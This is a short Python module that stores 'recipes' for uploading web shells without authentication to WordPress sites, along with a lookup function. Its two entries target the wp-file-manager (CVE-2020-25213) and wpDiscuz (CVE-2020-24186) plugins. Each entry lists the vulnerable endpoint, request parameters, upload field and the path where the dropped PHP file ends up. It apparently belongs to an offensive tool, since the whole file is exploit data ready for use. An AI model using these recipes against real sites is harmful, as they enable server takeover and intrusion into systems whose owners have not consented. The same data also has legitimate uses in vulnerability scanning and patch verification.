"""Curated unauthenticated WordPress webshell-upload recipes."""

RECIPES = [
    {
        "plugin": "wp-file-manager",
        "cve": "CVE-2020-25213",
        "affected": "<=6.8",
        "method": "POST",
        "endpoint": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "params": {"cmd": "upload", "target": "l1_Lw"},
        "field": "upload[]",
        "upload_path": "/wp-content/plugins/wp-file-manager/lib/files/{filename}",
        "source": "registry",
        "note": "elFinder connector exposed unauthenticated; no extension check.",
    },
    {
        "plugin": "wpdiscuz",
        "cve": "CVE-2020-24186",
        "affected": ">=7.0.0,<=7.0.4",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "wmuUploadFiles", "wmu_nonce": ""},
        "field": "wmu_files[0]",
        "upload_path": "/wp-content/uploads/{filename}",
        "source": "registry",
        "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/.",
    },
]


def find_recipes(plugin_slug):
    return [r for r in RECIPES if r["plugin"] == plugin_slug]
